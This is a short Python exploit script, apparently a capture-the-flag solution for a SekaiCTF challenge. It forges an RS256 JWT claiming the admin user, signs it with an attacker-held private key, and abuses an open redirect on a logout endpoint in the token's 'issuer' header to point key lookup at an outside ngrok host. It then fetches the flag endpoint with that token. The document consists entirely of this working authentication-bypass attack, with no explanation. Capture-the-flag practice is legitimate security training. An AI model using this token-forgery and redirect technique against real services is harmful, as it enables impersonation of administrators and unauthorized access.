import requests
import jwt

URL = "http://issues-3m7gwj1d.ctf.sekai.team"
with open('attacker_web/private.pem') as f:
    key = f.read()
Bearer = jwt.encode(
    algorithm='RS256',
    headers={
        'issuer': 'http://localhost:8080/logout?redirect=http://0.tcp.ap.ngrok.io:10874/'},
    key=key,
    payload={'user': 'admin'}
)
header = {
    "Authorization": f"Bearer {Bearer}"
}
req = requests.get(f"{URL}/api/flag", headers=header)
print(req.text)
